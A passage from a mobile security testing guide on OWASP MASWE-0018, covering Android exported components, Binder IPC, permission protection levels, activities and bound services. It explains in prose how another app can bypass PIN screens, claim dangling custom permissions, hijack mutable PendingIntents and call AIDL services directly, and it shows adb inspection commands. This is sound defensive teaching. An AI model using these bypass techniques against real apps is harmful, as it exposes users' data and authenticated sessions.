---
title: "Lack of Authentication or Authorization on App Components (MASWE-0018)"
date: 2026-11-09 08:38:00 +0000
subcategory: auth
summary: "Testing exported activities, services, receivers and content providers for missing caller checks, with adb, drozer, attacker apps and fixes."
refs: [MASWE-0018, MASVS-AUTH-1, MASVS-PLATFORM-1, MASVS-STORAGE-2, CWE-306, CWE-749, CWE-862, CWE-863, CWE-923, CWE-926, CWE-939, CWE-940]
tags: [android, ios, masvs-auth, ipc, exported-components, content-provider]
---

This note opens our [MASVS-AUTH guide](/mobile/masvs-auth-authentication-guide/) and covers OWASP [MASWE-0018](https://mas.owasp.org/MASWE/MASVS-AUTH/MASWE-0018/): app components that do something sensitive for whoever asks. A login screen, a PIN gate or a biometric prompt only protects what sits behind it if every *other* way in is closed too. On Android the other ways in are the four component types — activities, services, broadcast receivers and content providers — plus Binder interfaces, `PendingIntent`s, URI permission grants and the occasional local socket; on iOS they are custom URL schemes, universal links and app extensions. Below you will find how each mechanism decides who may call it, the defaults that changed between Android 4.2 and Android 14, permission protection levels and the ways custom permissions fail, the six OWASP tests with their demos, our supplementary checks for intent redirection, bound services, runtime receivers, provider injection and local ports, a minimal attacker app in Kotlin, a short iOS section, secure patterns and severity guidance.

## Contents

- [Overview](#overview)
- [Modes of Introduction](#modes-of-introduction)
- [Impact](#impact)
- [Mitigations](#mitigations)
- [Knowledge](#knowledge)
  - [Android: Inter-Process Communication (IPC) Mechanisms (MASTG-KNOW-0020)](#android-inter-process-communication-ipc-mechanisms-mastg-know-0020)
  - [Android: App Permissions (MASTG-KNOW-0017)](#android-app-permissions-mastg-know-0017)
  - [Android: Activities (MASTG-KNOW-0132)](#android-activities-mastg-know-0132)
  - [Android: Services (MASTG-KNOW-0133)](#android-services-mastg-know-0133)
  - [Android: Broadcast Receivers (MASTG-KNOW-0134)](#android-broadcast-receivers-mastg-know-0134)
  - [Android: ContentProvider (MASTG-KNOW-0117)](#android-contentprovider-mastg-know-0117)
  - [iOS: URL schemes, universal links and app extensions (supplementary)](#ios-url-schemes-universal-links-and-app-extensions-supplementary)
- [Tests](#tests)
  - [Before you start: building the attack surface inventory](#before-you-start-building-the-attack-surface-inventory)
  - [MASTG-TEST-0364: Exported And Unprotected Activities That Expose Sensitive Functionality (Android)](#mastg-test-0364-exported-and-unprotected-activities-that-expose-sensitive-functionality-android)
  - [MASTG-TEST-0365: Exported And Unprotected Services That Expose Sensitive Functionality (Android)](#mastg-test-0365-exported-and-unprotected-services-that-expose-sensitive-functionality-android)
  - [MASTG-TEST-0366: Exported And Unprotected Broadcast Receivers That Expose Sensitive Functionality (Android)](#mastg-test-0366-exported-and-unprotected-broadcast-receivers-that-expose-sensitive-functionality-android)
  - [MASTG-TEST-0355: References to Unauthorized Database Access through Content Providers (Android)](#mastg-test-0355-references-to-unauthorized-database-access-through-content-providers-android)
  - [MASTG-TEST-0356: Runtime Verification of Unauthorized Database Access through Content Providers (Android)](#mastg-test-0356-runtime-verification-of-unauthorized-database-access-through-content-providers-android)
  - [MASTG-TEST-0357: References to Oversharing of File-Based Content Providers (Android)](#mastg-test-0357-references-to-oversharing-of-file-based-content-providers-android)
  - [Supplementary checks (Guler Tech methodology)](#supplementary-checks-guler-tech-methodology)
  - [GT-0018-1: Intent redirection and URI permission grants (Android)](#gt-0018-1-intent-redirection-and-uri-permission-grants-android)
  - [GT-0018-2: Bound services and AIDL caller checks (Android)](#gt-0018-2-bound-services-and-aidl-caller-checks-android)
  - [GT-0018-3: Runtime-registered receivers and outgoing broadcasts (Android)](#gt-0018-3-runtime-registered-receivers-and-outgoing-broadcasts-android)
  - [GT-0018-4: Custom permission definitions (Android)](#gt-0018-4-custom-permission-definitions-android)
  - [GT-0018-5: Content provider injection, path permissions and file access (Android)](#gt-0018-5-content-provider-injection-path-permissions-and-file-access-android)
  - [GT-0018-6: Local network services and sockets (Android)](#gt-0018-6-local-network-services-and-sockets-android)
  - [GT-0018-7: URL schemes, universal links and extensions that act without authentication (iOS)](#gt-0018-7-url-schemes-universal-links-and-extensions-that-act-without-authentication-ios)
  - [A minimal attacker app in Kotlin](#a-minimal-attacker-app-in-kotlin)
  - [Proving what the server trusts](#proving-what-the-server-trusts)
- [Best practices](#best-practices)
  - [MASTG-BEST-0052: Restrict Access to Android App Components](#mastg-best-0052-restrict-access-to-android-app-components)
  - [MASTG-BEST-0049: Restrict and Validate Access to Exported Content Providers](#mastg-best-0049-restrict-and-validate-access-to-exported-content-providers)
  - [Related OWASP best practices and secure patterns](#related-owasp-best-practices-and-secure-patterns)
- [Rating findings](#rating-findings)
- [References](#references)

## Overview

MASWE-0018 applies when a component that exposes data or functionality does not check who is calling it. The OWASP requirement is *"The app enforces authentication and authorization on its components."* The weakness covers every surface another process can reach: exported activities, services, broadcast receivers and content providers; Binder and `Messenger` interfaces; URI grants and `PendingIntent`s that lend the app's identity to someone else; local web servers and sockets; deep links and universal links that perform an action; and the handling of authentication material on those surfaces (tokens accepted without validation, logins inside WebViews).

The attacker OWASP has in mind is described by MAS-THREAT-0018 — *"Attackers can access sensitive data and functionality exposed by app components"* — and two attacks:

- **MAS-ATTACK-0038**: invoking exported or unprotected app components from another app installed on the device. This is the main case. The attacker is an ordinary app with no special permissions: a game, a flashlight, a trojanised clone, or a legitimate app with a malicious SDK inside it. It needs nothing more than to be installed.
- **MAS-ATTACK-0039**: connecting to open ports or local services exposed by the app. Any app holding the `INTERNET` permission (a normal permission, granted at install) can connect to `127.0.0.1`; a service bound to `0.0.0.0` is reachable from the Wi-Fi network as well.

Why this sits in MASVS-AUTH rather than only in MASVS-PLATFORM: an unprotected component is an **authorisation bypass inside the client**. The app has a model of who may do what — "the user must enter the PIN before this screen", "only our companion app may call this service", "only logged-in users can change the password" — and the component lets a caller skip that model. Very often the component then acts with the *user's* authenticated session: an exported service that changes the password calls the backend with the stored access token, and the server cannot tell that the request was triggered by malware rather than by the user. MASVS-AUTH-1 says authentication and authorisation must be enforced at the remote endpoint; MASWE-0018 is where you find out how much of the app's model actually lives only in the client.

Keep three questions apart when you test, because they decide severity and who has to fix what:

| Question | Who can answer it | Typical evidence |
|---|---|---|
| Can another app reach the component? | You, from the client | Manifest, `dumpsys`, a successful `am`/`content` call or attacker-app call |
| Does the component do something sensitive without checking the caller? | You, from the client | Decompiled code, observable effect (screen shown, data returned, state changed) |
| Does the server rely on the client having checked? | You, with a proxy — and backend testing to be sure | The same API requests are accepted whether the user went through the PIN screen or not; no step-up proof is sent |

The first two prove MASWE-0018. The third turns it from "client-side bypass" into "the PIN, the confirmation screen or the login was never a security control", and it points at OWASP ASVS 5.0 requirements in V6 (Authentication), V7 (Session Management) and V8 (Authorization), and the WSTG authorisation tests (WSTG-ATHZ-02, bypassing the authorisation schema). See [Proving what the server trusts](#proving-what-the-server-trusts).

**Profiles.** MASWE-0018 is tagged L1, L2 and EUDIW: it is a baseline requirement for every app, not an advanced hardening item. An exported component that hands out a session token is a finding in a to-do-list app as much as in a bank.

**Mappings.** MASVS v2: MASVS-AUTH-1, MASVS-PLATFORM-1 (secure use of IPC) and MASVS-STORAGE-2 (preventing leakage of stored data). MASVS v1: MSTG-PLATFORM-4, MSTG-AUTH-3, MSTG-NETWORK-2, MSTG-STORAGE-6. CWE: [CWE-306](https://cwe.mitre.org/data/definitions/306.html) (missing authentication for critical function), [CWE-749](https://cwe.mitre.org/data/definitions/749.html) (exposed dangerous method), [CWE-862](https://cwe.mitre.org/data/definitions/862.html) (missing authorisation), [CWE-863](https://cwe.mitre.org/data/definitions/863.html) (incorrect authorisation), [CWE-923](https://cwe.mitre.org/data/definitions/923.html) (communication channel to an unverified endpoint), [CWE-926](https://cwe.mitre.org/data/definitions/926.html) (improper export of Android components), [CWE-939](https://cwe.mitre.org/data/definitions/939.html) (improper authorisation in a custom URL scheme handler) and [CWE-940](https://cwe.mitre.org/data/definitions/940.html) (improper verification of the source of a communication channel). Android's own risk catalogue covers the same ground under *android:exported*, *access control to exported components*, *custom permissions*, *insecure broadcast receivers*, *content resolvers* and *file providers*.

The OWASP tests linked to MASWE-0018 are all Android tests. iOS has far fewer component types and no equivalent of an exported service, but the weakness is tagged for both platforms; our [iOS supplement](#ios-url-schemes-universal-links-and-app-extensions-supplementary) covers the cases that matter for authentication, and the deep-link and extension mechanisms themselves will be covered in our MASVS-PLATFORM series.

## Modes of Introduction

**Unintentionally exported components.** The component was meant to be internal but is reachable: an `<intent-filter>` on an app targeting Android 11 or lower without `android:exported="false"`; a provider in an app with `minSdkVersion` or `targetSdkVersion` of 16 or lower (default export); `android:exported="true"` copied from a template; an `<activity-alias>` that exports a private activity; or an SDK whose components were merged into the final manifest without anyone reviewing them.

**Missing or weak permissions on exported components.** The component is meant to be reachable by *some* apps and is protected by nothing, or by a permission any app can obtain: a custom permission with `protectionLevel="normal"` (or no protection level, which defaults to `normal`), a `dangerous` permission the user will happily grant, a typo in the permission name, or a permission defined only by a companion app that may not be installed.

**Caller not verified on IPC interfaces.** A bound service returns an AIDL `Stub` or a `Messenger` and processes every transaction. The manifest permission, if any, is checked once at bind time; nothing checks `Binder.getCallingUid()` or `checkCallingPermission()` per call, and nothing checks the caller's signature.

**Over-broad data grants.** `android:grantUriPermissions="true"` on a provider holding private data, `FLAG_GRANT_PERSISTABLE_URI_PERMISSION` or `FLAG_GRANT_PREFIX_URI_PERMISSION` where a one-off grant would do, `FileProvider` paths of `.` or `<root-path>`, sticky broadcasts, implicit broadcasts carrying tokens, and mutable `PendingIntent`s with empty base intents.

**Confused deputies.** The exported component is harmless on its own but forwards something the caller supplied: an `Intent` extra passed to `startActivity()` (intent redirection), a file name passed to `FileProvider.getUriForFile()`, a URL loaded into a WebView with a JavaScript bridge, or a `selection` string concatenated into SQL.

**Unprotected local network services.** An embedded HTTP server (for media casting, a payment terminal bridge, a debug console or a WebView asset server) bound to `0.0.0.0` or to localhost without authentication; an abstract Unix socket without a peer credential check.

**Authentication material not validated.** A component accepts a token, a "logged in" flag or a user ID from the caller and trusts it, or a deep link delivers an OAuth code to whichever app registered the scheme first. OAuth for native apps belongs in the system browser with PKCE ([RFC 8252](https://www.rfc-editor.org/rfc/rfc8252), [RFC 7636](https://www.rfc-editor.org/rfc/rfc7636), [RFC 9700](https://www.rfc-editor.org/rfc/rfc9700)), not in a WebView that the app — or anything that can drive it — controls.

**Missing authentication or authorisation on deep links.** `myapp://reset-password?token=…`, `https://example.com/app/transfer?to=…&amount=…` or `myapp://link-device?code=…` performs the action immediately instead of requiring an authenticated session and an explicit confirmation. Any app, web page, QR code or message can send the link.

## Impact

- **Compromise of sensitive data.** Another app queries an unprotected provider, receives a broadcast, opens a file through a URI grant or reads a result intent, and obtains PII, health records, messages, session tokens or encryption keys. A single provider query typically returns the whole table.
- **Authentication or authorisation bypass.** Another app invokes privileged functionality — change the password or PIN, add a payee, disable a security setting, link a device, export data — without the user authenticating, often with the user's live session. The backend sees ordinary authenticated requests.
- **Bypass of protection mechanisms.** An internal activity is started directly, skipping the login, PIN, biometric or paywall screen that normally precedes it. If what is behind the screen is not itself protected (see [MASWE-0020](/mobile/maswe-0020-local-authentication-bypass/)), the screen was decorative.
- **Escalation through the app's identity.** Intent redirection and mutable `PendingIntent`s let the attacker act *as* the victim app: reach its non-exported components, read its private providers, or use permissions the victim holds (contacts, SMS, location) that the attacker does not.

## Mitigations

- **Do not export what does not need to be exported.** Set `android:exported="false"` explicitly on every internal component, remove intent filters from internal components, and use explicit intents internally.
- **Protect intentionally exported components with an effective permission.** Usually a custom permission with `protectionLevel="signature"`, or `signature|knownSigner` for named partner apps (Android 12+). `normal` and `dangerous` permissions are not access control between apps.
- **Verify the caller on every IPC call.** In bound services and providers, check `Binder.getCallingUid()`, `checkCallingPermission()` or the caller's signing certificate before acting; in providers, remember that `call()` is not covered by the manifest read/write permissions.
- **Grant minimal, short-lived data access.** Non-exported `FileProvider` with narrow paths, one-off `FLAG_GRANT_READ_URI_PERMISSION` grants on explicit intents, immutable `PendingIntent`s with explicit base intents, no sticky broadcasts, broadcasts restricted to a package or permission.
- **Validate everything that crosses the boundary.** Never forward a caller-supplied `Intent`; parameterise SQL and lock down projections; canonicalise file paths; treat deep-link parameters as untrusted.
- **Keep the decision on the server.** Sensitive operations should require server-side authorisation and, where appropriate, step-up authentication ([MASWE-0023](/mobile/maswe-0023-step-up-authentication-not-implemented/)) so that reaching the client code path is not enough.
- **Authenticate local services**, or do not run them. Bind to loopback, require a per-session secret, check peer credentials on Unix sockets.
- **Validate authentication material server-side** (signature, issuer, audience, expiry) and use the system browser with PKCE for OAuth.

## Knowledge

The six Android Knowledge pages OWASP links to MASWE-0018 cover the IPC model, permissions and the four component types. We go through each with the detail you need to decide whether a component is reachable and whether it checks its caller. Related OWASP pages we draw on without a section of their own: [MASTG-KNOW-0024 (Pending Intents)](https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0024/), [MASTG-KNOW-0025 (Explicit vs Implicit Intents)](https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0025/) and [MASTG-KNOW-0019 (Deep Links)](https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0019/).

### Android: Inter-Process Communication (IPC) Mechanisms (MASTG-KNOW-0020)

Source: [MASTG-KNOW-0020](https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0020/).

Every Android app runs as its own Linux user in its own process, and nothing in that sandbox is visible to another app unless the app deliberately exposes it. Almost all deliberate exposure goes through **Binder**, Android's kernel-mediated IPC: the `/dev/binder` driver, an `ioctl` protocol, the `IBinder` interface and the proxy/stub objects generated on top of it. When app A calls a method on a proxy, the arguments are marshalled into a `Parcel` and sent as a *transaction* to app B's Binder thread pool, which unmarshals them and invokes the real object. To the developer it looks like a local method call, which is exactly why caller checks get forgotten.

Three properties of Binder matter for this weakness:

- **The kernel tells the receiver who is calling.** Inside a transaction, `Binder.getCallingUid()` and `Binder.getCallingPid()` return the caller's UID and PID as recorded by the driver; the caller cannot forge them. Every permission check on Android — `checkCallingPermission()`, the manifest `android:permission` attribute, provider read/write permissions — is ultimately a lookup of "does this UID hold that permission". If a component does not ask, nothing stops the call.
- **The calling identity is only valid on the Binder thread, during the transaction.** If the service hands the work to a `Handler`, an executor or a coroutine and calls `getCallingUid()` there, it gets its *own* UID. That bug turns a correct-looking check into one that always passes.
- **Intents travel over Binder too.** `startActivity()`, `startService()`, `bindService()`, `sendBroadcast()` and `ContentResolver` calls are transactions to `system_server`, which resolves the target, applies the manifest access rules and delivers the call. The manifest rules are enforced there, centrally; anything finer-grained is the app's job.

The four **component types** are the IPC entry points declared in the manifest. For each, `android:exported` decides whether components of *other* apps can reach it at all, and `android:permission` (plus `readPermission`/`writePermission` for providers) decides which of those apps. Components of the same app, apps sharing the same UID via the deprecated `android:sharedUserId`, and privileged system components can always reach a component regardless of `exported`.

**Intents.** An intent is **explicit** when it names a package or component (`Intent(context, Foo::class.java)`, `setClassName()`, `setComponent()`, `setPackage()`), and **implicit** when it only describes an action, data and categories and lets the system pick a component whose `<intent-filter>` matches. Implicit intents are a leak in the other direction: any app that declares a matching filter can receive them, extras and all ([MASTG-BEST-0056](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0056/)). Intent filters are *not* access control: they only describe what a component can handle.

**Platform changes that affect both attack and test.** These shift results between devices and between target SDKs, so record both the device's Android version and the app's `targetSdkVersion` in every finding:

| Change | Applies to | Effect for this weakness |
|---|---|---|
| Android 4.2 (API 17) | Providers in apps with `minSdkVersion` and `targetSdkVersion` of 17 or higher | Providers no longer exported by default |
| Android 8.0 (API 26) | Apps targeting 26+ | Manifest receivers no longer receive most implicit broadcasts; explicit broadcasts still arrive |
| Android 11 (API 30) | Apps targeting 30+ (including *your* attacker app) | Package visibility: an app must declare `<queries>` (or hold `QUERY_ALL_PACKAGES`) to see, bind to or query most other packages |
| Android 12 (API 31) | Apps targeting 31+ | `android:exported` mandatory on components with intent filters (install fails otherwise); `PendingIntent` mutability must be declared; `knownSigner` protection flag available |
| Android 13 (API 33) | Apps targeting 33+ receiving the intent | Intents sent to an exported component must match one of its intent filters or they are dropped (exceptions: components without filters, same-app intents, system and root senders); `RECEIVER_EXPORTED`/`RECEIVER_NOT_EXPORTED` flags available |
| Android 14 (API 34) | Apps targeting 34+ | Runtime receivers for non-system broadcasts must declare an export flag; implicit intents from the app are only delivered to exported components; creating a mutable `PendingIntent` with an implicit intent throws |

The API 33 filter-matching rule is the one that most often produces false negatives in testing: an `am start -n` or `am broadcast -n` without the action from the component's filter is silently dropped on a modern target, and you conclude the component is safe when it is not. Always copy the action, categories and data from the filter into your test intent.

**PendingIntent.** A `PendingIntent` wraps a base intent and a token that lets *another* app send it later **as the creating app**, with the creator's identity and permissions ([MASTG-KNOW-0024](https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0024/)). Notifications, widgets, alarms and media sessions use them so that the app does not have to export a component. The risk is mutability: when the `PendingIntent` is created with `FLAG_MUTABLE` (or, before Android 12, without `FLAG_IMMUTABLE`), the app that holds it can fill in fields the base intent left empty — action, data, clip data, categories, package, extras and the URI grant flags — when it calls `send()`. An empty or implicit base intent therefore lets the holder point the creator's identity at a component of its choice, including the creator's own non-exported components and providers. Since API 31 the mutability flag is mandatory, and since API 34 a mutable `PendingIntent` with an implicit base intent throws `IllegalArgumentException` unless the developer opts out with `FLAG_ALLOW_UNSAFE_IMPLICIT_INTENT`. OWASP tests the creation side in [MASTG-TEST-0381](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0381/) (mapped to [MASWE-0032](https://mas.owasp.org/MASWE/MASVS-PLATFORM/MASWE-0032/), Insecure Intents); in this note it matters because a hijacked `PendingIntent` is a way to reach components that are correctly not exported.

**Other IPC.** Not every entry point is a component. Watch for `Messenger`-based services, the clipboard, files shared through `FileProvider`, `LocalServerSocket` (abstract Unix sockets, reachable by any app that knows the name) and TCP/UDP sockets opened by embedded servers. To see what the system has registered, `adb shell service list` lists system services in `ServiceManager`; app-bound services do not appear there, so `adb shell service call` cannot be used to test them.

### Android: App Permissions (MASTG-KNOW-0017)

Source: [MASTG-KNOW-0017](https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0017/).

The OWASP page is mostly about the permissions an app *requests* and how their handling changed from Android 8 to 10 (permission groups, call-log and phone-number restrictions, scoped storage). For MASWE-0018 the relevant part is the other direction: the permissions an app **defines and enforces** to protect its own components, and how strong those protections are.

**Protection levels.** A permission's `android:protectionLevel` decides who the system will grant it to. That, not the presence of `android:permission` on the component, decides whether the component is protected:

| Protection level | Granted to | Protects a component from a malicious app? |
|---|---|---|
| `normal` (also the default when `protectionLevel` is omitted) | Any app that lists it in `<uses-permission>`, silently at install | No |
| `dangerous` | Any app that requests it at runtime and the user approves | No — one social-engineered tap |
| `signature` | Apps signed with the same certificate as the app that **defines** the permission | Yes, for same-developer apps |
| `signature` plus the `privileged` flag (formerly `signatureOrSystem`, deprecated in API 23) | Same-signature apps and privileged system apps | Yes |
| `signature` plus the `knownSigner` flag (API 31), with `android:knownCerts` | Same-signature apps and apps whose signing certificate SHA-256 digest is in the `knownCerts` array | Yes, for an explicit list of partner apps |
| System permissions such as `android.permission.DUMP` or `BIND_JOB_SERVICE` | Platform-signed or privileged components only | Yes — and a common source of false positives |
| `appop` and other flags | Combinations used by the platform | Depends on the base level |

`knownSigner` deserves a sentence because it solves a real problem: before Android 12, two developers who needed to share a component either used a `normal` permission (no protection) or a homegrown signature check. With `android:protectionLevel="signature|knownSigner"` and `android:knownCerts="@array/partner_certs"` the platform does the check. The `knownCerts` array contains certificate digests, not package names, and is read from the defining app's manifest at install time.

**How enforcement differs per component.** OWASP's page lists the enforcement points; the differences are what catch testers out:

| Component | When the permission is checked | What a caller without it sees |
|---|---|---|
| Activity (`android:permission`) | `startActivity()` / `startActivityForResult()` | `SecurityException` thrown to the caller |
| Service (`android:permission`) | `startService()`, `stopService()`, `bindService()` | `SecurityException`; for binding, checked **once at bind time**, not per transaction |
| Receiver (`android:permission`, or `broadcastPermission` in `registerReceiver`) | At delivery, after `sendBroadcast()` has returned | Nothing — the broadcast is silently not delivered |
| Sender side (`sendBroadcast(intent, receiverPermission)`) | At delivery | Receivers without the permission silently do not get it |
| Provider (`readPermission`, `writePermission`, `permission`, `<path-permission>`) | On `query`/`openFile` (read) and `insert`/`update`/`delete` (write); **not** on `call()` | `SecurityException` |

Two consequences: a receiver permission test that "does nothing" is the expected result, so you confirm protection by the absence of an effect, never by an error message; and a bound service protected only by a manifest permission exposes every AIDL method to whoever got past the bind check, so the permission must be one that only trusted apps can hold.

**Custom permissions and how they fail.** A custom permission is declared with `<permission android:name="…" android:protectionLevel="…"/>` and enforced by naming it in a component's `android:permission`. The OWASP page's example uses `protectionLevel="normal"` to guard an activity; treat that as an illustration of syntax, not of protection. The failure modes we look for:

- **Normal or missing protection level.** Any app declares `<uses-permission>` and gets it at install. The component is effectively public.
- **Undefined permission (dangling reference).** The component requires `com.example.permission.ADMIN`, but no installed app defines it — perhaps it is defined only by a companion app, or the defining app was uninstalled. Nobody can hold an undefined permission, so the component looks protected. But an attacker app can **define** the permission itself, with `protectionLevel="normal"`, and grant it to itself. Since Android 5.0 a package cannot redefine a permission already defined by a package with a different signing key (installation fails with `INSTALL_FAILED_DUPLICATE_PERMISSION`), so the attack only works while the name is unclaimed — which is exactly the situation when the companion app is not installed or the victim only *uses* the permission.
- **Typos.** `android:permission="com.example.permision.READ_DATA"` on the component and `com.example.permission.READ_DATA` in the `<permission>` declaration. The enforced name is undefined, and the previous bullet applies. Android Lint ships checks for custom permission problems, but release builds are not always linted; check the merged manifest yourself.
- **Wrong owner.** The permission is defined in an SDK's manifest with `normal` level and merged into many apps; whichever app installs first owns the definition.
- **Install order before Android 5.0.** On very old devices the first app to define a name owned it, regardless of signature. Only relevant if the app's `minSdkVersion` is below 21.

**URI permissions.** Content providers add a second, capability-style mechanism. An app that can access a `content://` URI can grant a *specific* URI to another app by adding `FLAG_GRANT_READ_URI_PERMISSION` and/or `FLAG_GRANT_WRITE_URI_PERMISSION` to an intent whose data or `ClipData` holds that URI, or by calling `Context.grantUriPermission()`. The receiver gets access to that URI even if the provider is not exported and it holds no permission. The provider must opt in with `android:grantUriPermissions="true"` (all URIs) or `<grant-uri-permission>` children (`path`, `pathPrefix`, `pathPattern`) that limit which URIs can be granted. Two further flags widen a grant:

| Flag | Value | Effect |
|---|---|---|
| `FLAG_GRANT_READ_URI_PERMISSION` | `0x1` | Read access to the URI, until the receiving task finishes |
| `FLAG_GRANT_WRITE_URI_PERMISSION` | `0x2` | Write access |
| `FLAG_GRANT_PERSISTABLE_URI_PERMISSION` | `0x40` | Receiver may call `takePersistableUriPermission()` and keep the grant across reboots |
| `FLAG_GRANT_PREFIX_URI_PERMISSION` | `0x80` | Grant covers every URI that starts with the granted one |

A grant is a capability: whoever obtains it can use it. The danger is not the mechanism but an app that grants a URI chosen by someone else — see [GT-0018-1](#gt-0018-1-intent-redirection-and-uri-permission-grants-android). Grants are revoked with `revokeUriPermission()`; `checkUriPermission()` lets a provider verify a grant.

**Inspecting permissions on a device.** The package manager will tell you the real protection level of every permission, which is more reliable than reading a manifest that may reference a permission defined elsewhere:

```bash
# Permissions defined by the target, with protection levels
adb shell pm list permissions -f -g | grep -B1 -A6 'com.example.app'

# Declared, requested and granted permissions for one package
adb shell dumpsys package com.example.app | sed -n '/declared permissions:/,/User 0:/p'

# Is a given permission defined at all, and by whom?
adb shell dumpsys package permission com.example.permission.ADMIN
```

`dumpsys package permission <name>` prints the defining package and `prot=` level when the permission exists, and nothing useful when it is undefined — which is the dangling-reference case.

### Android: Activities (MASTG-KNOW-0132)

Source: [MASTG-KNOW-0132](https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0132/).

An activity is one screen. It is declared with `<activity>` in the manifest, created by the system when an intent targets it, and driven through the lifecycle callbacks (`onCreate`, `onStart`, `onResume`, `onPause`, `onStop`, `onDestroy`, plus `onNewIntent` when an existing instance receives a new intent). Apps built with Jetpack Compose often have a single activity and navigate between composables internally; older apps have dozens of activities, and each one is a potential entry point.

**Export rules.** These apply to activities, services and receivers alike, and you need them to interpret every manifest:

| Component declares | `android:exported` set? | Target SDK | Effective state |
|---|---|---|---|
| No intent filter | No | Any | Not exported |
| One or more intent filters | No | 30 or lower | **Exported** |
| One or more intent filters | No | 31 or higher | Not installable (`INSTALL_PARSE_FAILED_MANIFEST_MALFORMED`) |
| Any | `true` / `false` | Any | As declared |

The second row is the classic unintentional export, and it is still common: apps targeting 30 or lower can be installed on current devices, and the Play Store minimum target API only applies to new uploads and updates, not to apps already on devices or distributed elsewhere. Decompiled manifests from jadx or apktool show the attribute only when it was present in the source; when it is missing, apply the table.

`<activity-alias>` elements have their own `exported`, `permission` and filters. A private activity with a public alias is a public activity.

**Why exported activities break authentication flows.** An app typically implements "authenticate, then show the sensitive screen" as two activities: `PinEntryActivity` checks the PIN and starts `SecretActivity`. If `SecretActivity` is exported and does nothing in `onCreate` to verify that authentication happened, `am start -n` skips the PIN entirely. OWASP's demo for MASTG-TEST-0364 is exactly that. The fix is not to make the PIN screen stronger; it is to make `SecretActivity` unreachable (not exported) **and** to make the data behind it require authentication — ideally a Keystore key bound to user authentication ([MASWE-0016](/mobile/maswe-0016-key-access-not-restricted/)) or a server-side session check, not a boolean in memory that the activity reads.

**Inputs.** An exported activity receives everything in the intent: action, data URI, categories, extras (`--es`, `--ei`, `--ez` with `am`), clip data and flags. Typical sinks: a WebView loading a URL from an extra, a `startActivity()` with a nested `Intent` extra ([intent redirection](#gt-0018-1-intent-redirection-and-uri-permission-grants-android)), a `setResult()` that returns sensitive data or a URI grant to whoever started it for a result, a file path passed to `FileProvider.getUriForFile()`, and deep-link parameters that trigger actions ([MASTG-KNOW-0019](https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0019/), [MASWE-0029](https://mas.owasp.org/MASWE/MASVS-PLATFORM/MASWE-0029/)).

**Who started me?** Activities have weak caller identification, and developers misuse what exists:

- `getCallingActivity()` and `getCallingPackage()` return a value only when the activity was started with `startActivityForResult()` (or the Activity Result APIs). For a plain `startActivity()` they return `null`.
- `getReferrer()` is **not** an identity check: it reports `Intent.EXTRA_REFERRER` (or `EXTRA_REFERRER_NAME`) when the caller set it, so a malicious caller can claim to be anyone.
- Android 14 (API 34) added `Activity.getLaunchedFromUid()` and `getLaunchedFromPackage()`, which return the real caller only if the caller opted in with `ActivityOptions.setShareIdentityEnabled(true)`. Useful between cooperating apps; useless against an attacker, who will simply not opt in.

In practice, an activity cannot authenticate its caller; it can only be made unreachable or protected with a permission. Authentication of the *user* must come from state the activity cannot be tricked into assuming.

**Launcher and deep-link activities** are exported by necessity. They are in scope: check that they do not perform actions on launch and that parameters from the intent are validated (Android 13+ also rejects intents that do not match their filters, but that is a filter check, not authentication).

### Android: Services (MASTG-KNOW-0133)

Source: [MASTG-KNOW-0133](https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0133/).

A service does work without a UI. There are three shapes, and each has a different attack surface:

- **Started services** receive an intent in `onStartCommand(intent, flags, startId)`; the extras are the input. Started with `startService()` or, for foreground work, `startForegroundService()` (which must call `startForeground()` within a few seconds, and since Android 14 declare a foreground service type).
- **Bound services** return an `IBinder` from `onBind()`; clients call methods on it for as long as they stay bound. The binder is usually an AIDL-generated `Stub`, a `Messenger` (messages identified by `msg.what`, with `arg1`, `arg2`, `obj` and a `Bundle`), or a local `Binder` subclass that only works in-process.
- **Scheduled work** (`JobService`, WorkManager's `SystemJobService`) is a service invoked by the system and protected by `android:permission="android.permission.BIND_JOB_SERVICE"`, which only the system holds.

The same export rules as activities apply. Services frequently run in a separate process (`android:process=":remote"`), which is a hint that they were designed for cross-process callers.

**Bind-time versus call-time checks.** `android:permission` on a `<service>` is checked when a client calls `startService()` or `bindService()`. Once bound, the client can make any number of calls to any method of the interface with no further framework checks. A service that exposes different operations to different callers — "any app may read the status, only our app may change the PIN" — must check inside each method:

| API | Use |
|---|---|
| `Binder.getCallingUid()` / `getCallingPid()` | Identity of the caller of the current transaction |
| `checkCallingPermission(perm)` | Does the IPC caller hold `perm`? Returns `PERMISSION_DENIED` when not in an IPC call |
| `enforceCallingPermission(perm, msg)` | Same, throws `SecurityException` |
| `checkCallingOrSelfPermission(perm)` | Grants if the caller **or this app** holds `perm` — dangerous: if the app holds the permission, every caller passes |
| `PackageManager.hasSigningCertificate(uid, certSha256, CERT_INPUT_SHA256)` (API 28) | Is the caller signed with a specific certificate? |
| `Message.sendingUid` | UID of the app that sent a `Message` through a `Messenger` |
| `Binder.clearCallingIdentity()` / `restoreCallingIdentity()` | Temporarily act as this app; any check performed between the two calls tests the app itself, not the caller |

Bugs we find repeatedly: `checkCallingOrSelfPermission()` used where `checkCallingPermission()` was meant; `getCallingUid()` read inside a `Handler.handleMessage()` (always the app's own UID); the check done in `onBind()` against the binding intent's extras ("caller says it is the companion app"); and checks performed on package *names* from `getPackagesForUid()` without verifying the signing certificate, which any app can satisfy by choosing that package name on a device where the real one is not installed.

**AIDL from the attacker's side.** You do not need the original `.aidl` file to call a service. The generated `Stub` contains a `DESCRIPTOR` string (the interface name) and constants such as `TRANSACTION_resetPin = 2`, numbered from `IBinder.FIRST_CALL_TRANSACTION` in declaration order. With those, an attacker app can call `transact()` on the raw `IBinder`, writing the interface token and arguments in the same order the `Stub.onTransact()` reads them. See [GT-0018-2](#gt-0018-2-bound-services-and-aidl-caller-checks-android).

